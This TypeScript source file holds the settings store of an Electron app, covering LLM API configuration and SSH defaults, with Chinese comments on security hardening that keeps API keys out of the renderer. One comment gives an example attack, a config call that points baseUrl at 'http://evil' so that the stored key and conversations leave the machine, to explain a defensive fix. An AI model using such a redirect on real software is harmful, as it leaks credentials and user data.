/**
 * 设置状态管理 Store（Zustand）
 *
 * 职责：
 * - 管理 LLM 配置（API Key / Base URL / 模型名 / 温度等）
 * - 管理 SSH 默认配置（默认端口 / 用户名 / 超时）
 * - 提供 loadSettings / saveSettings 方法与主进程同步
 *
 * 持久化策略：
 * - 非敏感配置（baseUrl/model/temperature 等）持久化到 localStorage
 * - 敏感信息（apiKey）只写不读：通过主进程 safeStorage 加密落盘
 *
 * 2026-10-09 安全审查 P0-3：渲染层不再能读回 API Key 原文。
 * 原先 `storage:getApiKey` 把解密后的 Key 整条交给设置页，加密只剩"防落盘"，
 * 渲染层一次 XSS 或被投毒依赖就能捞走全部 Key。通道已删除，改为
 * `storage:hasApiKey` 只回布尔；界面用 hasLlmApiKey 决定提示文案，Key 永不回显。
 */
import { create } from 'zustand'
import { persist } from 'zustand/middleware'
import type { LlmConfig, SshConfig } from '@shared/models'
import { isElectronAPIAvailable } from '../utils/electron-api'

/**
 * 默认 LLM 配置
 *
 * v2.3.4 修复：与 ModelSettings 默认值对齐（DeepSeek Flash 档）
 * - 之前默认火山方舟，但用户多数未配置火山 key → 导致连接失败被误判为大模型不可用
 * - DeepSeek Flash 档是国内可用 + 长上下文 + 价格亲民，对个人/教学用户最友好
 * - 用户可在设置中切换为其他 Provider（Provider 列表是真实可用的）
 * - 2026-10-10：默认 model 从已下线的 deepseek-v4-flash 改成 deepseek-flash，
 *   baseUrl 补上 /v1 —— @ai-sdk/openai 不会替我们补版本段，缺了就打在不存在的路径上
 *   （判据见 tests/unit/provider-baseurl-join.test.ts，它拿真 SDK 组一次 URL）
 *
 * 注意：endpoint/model/温度等是基线默认值，ModelSettings 加载时会用 Provider 列表的
 * 默认值再次覆盖，确保与 Provider 模板同步。
 */
const DEFAULT_LLM_CONFIG: LlmConfig = {
  baseUrl: 'https://api.deepseek.com/v1',
  apiKey: '',
  model: 'deepseek-flash',
  temperature: 0.3,
  maxTokens: 4096,
  timeout: 60000,
}

/** 默认 SSH 配置 */
const DEFAULT_SSH_DEFAULTS: Partial<SshConfig> = {
  port: 22,
  username: 'root',
  authType: 'password',
  // K.3：心跳保活间隔默认值，与后端 KEEPALIVE_DEFAULT_INTERVAL_SEC 一致（30 秒），
  // 渲染层 SshSettings 滑块不再使用本地 state，统一从此处读取。
  keepAliveIntervalSec: 30,
  // Phase L：默认启用严格主机密钥校验（known_hosts 验证）
  strictHostKeyCheck: true,
  // Phase L：默认 known_hosts 文件路径
  knownHostsPath: '~/.ssh/known_hosts',
}

/** 设置 Store 状态接口 */
interface SettingsState {
  /** LLM 配置（apiKey 只在用户当场输入时短暂存在，永不从主进程读回原文） */
  llmConfig: LlmConfig
  /**
   * 主进程是否存有 LLM 的 API Key（SecureStore 里的 'llm' 这条）
   *
   * 界面用它决定 API Key 输入框显示"已保存（留空则不修改）"还是"还没填"。
   * 只有布尔量跨进程边界，Key 原文一行都不给渲染层。
   * 不持久化：每次启动由 loadSettings 向主进程重新确认。
   */
  hasLlmApiKey: boolean
  /** SSH 默认配置 */
  sshDefaults: Partial<SshConfig>
  /** SSH 连接超时（毫秒） */
  sshTimeout: number

  // ===== Actions =====
  /** 设置 LLM 配置 */
  setLlmConfig: (config: Partial<LlmConfig>) => void
  /** 设置 SSH 默认配置 */
  setSshDefaults: (defaults: Partial<SshConfig>) => void
  /** 设置 SSH 超时 */
  setSshTimeout: (timeout: number) => void
  /** 从主进程加载设置 */
  loadSettings: () => Promise<void>
  /**
   * 保存设置到主进程
   *
   * @returns null=全部写入被主进程接受；字符串=没存进去的原因（调用方必须据此改提示，
   *   不能再无条件说"已保存"）。2026-10-15 全维度审查：这里以前把主进程的 false/信封丢掉，
   *   于是 safeStorage 不可用（Linux 无 libsecret）时界面报"配置已保存"，用户下次开机发现 Key 没了。
   */
  saveSettings: () => Promise<string | null>
}

/** 设置 Store */
export const useSettingsStore = create<SettingsState>()(
  persist(
    (set, get) => ({
      llmConfig: DEFAULT_LLM_CONFIG,
      hasLlmApiKey: false,
      sshDefaults: DEFAULT_SSH_DEFAULTS,
      sshTimeout: 30000,

      // 设置 LLM 配置
      setLlmConfig: (config) =>
        set((state) => ({
          llmConfig: { ...state.llmConfig, ...config },
        })),

      // 设置 SSH 默认配置
      setSshDefaults: (defaults) =>
        set((state) => ({
          sshDefaults: { ...state.sshDefaults, ...defaults },
        })),

      // 设置 SSH 超时
      setSshTimeout: (timeout) =>
        set({ sshTimeout: timeout }),

      // 从主进程加载设置
      loadSettings: async () => {
        try {
          // preload 未加载时，仅使用 localStorage 持久化数据
          if (!isElectronAPIAvailable()) {
            console.warn('[SettingsStore] electronAPI 不可用，跳过从主进程加载')
            return
          }
          const { configGet, storageHasApiKey } = window.electronAPI
          // 并行加载配置
          //
          // v2.3.4 修复：API Key 存储 key 从 'llm_api_key' 改为 'llm'
          // - 主进程 llm.ts 的 getLlmClient() 调的是 SecureStore.getApiKey('llm')
          // - 之前前端用 'llm_api_key' 存，主进程用 'llm' 读 → 永远读不到用户填的 key
          //   → 这是"大模型连不上"的根因之一
          // - 改后两端都用 'llm'，存储 key 对齐
          //
          // 2026-10-09 P0-3：这里从 storageGetApiKey('llm') 换成 storageHasApiKey('llm')。
          // 渲染层从此只拿到"存没存过"这一个布尔量，拿不到 Key 原文；
          // configGet('llmConfig') 那份的 apiKey 字段由主进程强制置空，不再回填。
          const [llmConfig, sshDefaults, sshTimeout, hasApiKey] =
            await Promise.all([
              configGet<LlmConfig>('llmConfig'),
              configGet<Partial<SshConfig>>('sshDefaults'),
              configGet<number>('sshTimeout'),
              storageHasApiKey('llm'),
            ])

          set({
            llmConfig: llmConfig ?? get().llmConfig,
            sshDefaults: sshDefaults ?? get().sshDefaults,
            sshTimeout: sshTimeout ?? get().sshTimeout,
            hasLlmApiKey: hasApiKey,
          })
        } catch (error) {
          console.error('加载设置失败:', error)
        }
      },

      // 保存设置到主进程
      saveSettings: async (): Promise<string | null> => {
        try {
          // preload 未加载时，仅使用 localStorage 持久化数据
          if (!isElectronAPIAvailable()) {
            console.warn('[SettingsStore] electronAPI 不可用，跳过保存到主进程')
            return null
          }
          const { configSet, configSaveLlm, storageSaveApiKey } = window.electronAPI
          const { llmConfig, sshDefaults, sshTimeout } = get()
          /** 每一条写回来的拒绝都要报给界面；只留第一条会把"部分没存"说成"全存了" */
          const failures: string[] = []

          // v2.3.4 修复：API Key 存储 key 对齐到 'llm'（与主进程 llm.ts 读 key 一致）
          // - 之前用 'llm_api_key'，主进程 SecureStore.getApiKey('llm') 读不到
          // - 现在用 'llm'，与 ConfigStore.saveLlmConfig 内部的 SecureStore.saveApiKey('llm', ...) 一致
          //
          // 为什么这里必须是 `if (llmConfig.apiKey)`（只判非空，不做"清空"语义）：
          // 输入框在已存过 Key 时显示"已保存（留空则不修改）"，用户留空 = 不想改 Key，
          // 不是想删 Key。若把空字符串也写进 SecureStore，等于把用户存好的 Key 覆盖成空
          // → 大模型直接失联，而且界面上永远看不到原 Key（不再回显），用户也无法自行恢复。
          // 真要作废这个 Key 必须由显式动作去调 storage:deleteApiKey（当前 UI 还没有这个入口），
          // 不能拿"输入框留空"当删除指令。
          if (llmConfig.apiKey) {
            const keySaved = await storageSaveApiKey('llm', llmConfig.apiKey)
            if (keySaved) {
              // 主进程确认存好了，界面提示才翻成"已保存"。
              // 这里只翻布尔量：写完不回读，llmConfig.apiKey 里留着的只是用户刚输入的那一份。
              set({ hasLlmApiKey: true })
            } else {
              // 加密后端不可用时主进程是 return false 而不是抛错（Linux 没装 libsecret 就是这样），
              // 以前这句被无视：界面说"配置已保存"，下次开机 Key 不在，用户以为是产品弄丢了。
              failures.push('API Key 没有存进系统安全存储（加密后端不可用），其余设置虽已写入但模型仍连不上')
            }
          }

          // 非敏感配置存入 config
          //
          // 2026-10-09 安全审查 P0-3：llmConfig 不再走自由键值通道 config:set。
          // 原因：主进程 llm-config-resolver 会把"渲染层可写的 baseUrl"与 SecureStore 里的
          // 真 Key 合并进同一个请求头 —— 一句 configSet('llmConfig',{baseUrl:'http://evil'})
          // 就等于把 Key 与全部对话外送。改走 config:saveLlm，baseUrl 不过策略就整条拒写。
          const safeLlmConfig = { ...llmConfig, apiKey: '' }
          const [llmSaved, defaultsSaved, timeoutSaved] = await Promise.all([
            configSaveLlm(safeLlmConfig),
            configSet('sshDefaults', sshDefaults),
            configSet('sshTimeout', sshTimeout),
          ])
          if (llmSaved && !llmSaved.ok) {
            failures.push(llmSaved.error ?? 'LLM 配置被主进程策略拒绝')
          }
          // config:set 回的是布尔量：拒写带权限的键、拒写非纯数据值都回 false。
          // false 和"写失败"对界面是同一句话，否则用户只看到"已保存"却什么都没变
          if (!defaultsSaved) failures.push('SSH 默认配置被主进程拒绝写入')
          if (!timeoutSaved) failures.push('SSH 连接超时被主进程拒绝写入')

          if (failures.length) {
            console.warn('[SettingsStore] 保存未全部生效:', failures)
            return failures.join('；')
          }
          return null
        } catch (error) {
          // IPC 抛错（通道被拒/主进程异常）以前只落 console，界面照样报"已保存"
          const msg = error instanceof Error ? error.message : String(error)
          console.error('保存设置失败:', error)
          return `保存失败：${msg}`
        }
      },
    }),
    {
      name: 'tdsf-settings-store',
      // 不持久化 apiKey；hasLlmApiKey 也不持久化（恒写 false，真相由 loadSettings 向主进程取）
      // - 持久化布尔量会带来"缓存说存过、主进程其实已删"的陈旧状态
      partialize: (state) => ({
        llmConfig: { ...state.llmConfig, apiKey: '' },
        hasLlmApiKey: false,
        sshDefaults: state.sshDefaults,
        sshTimeout: state.sshTimeout,
      }),
    }
  )
)
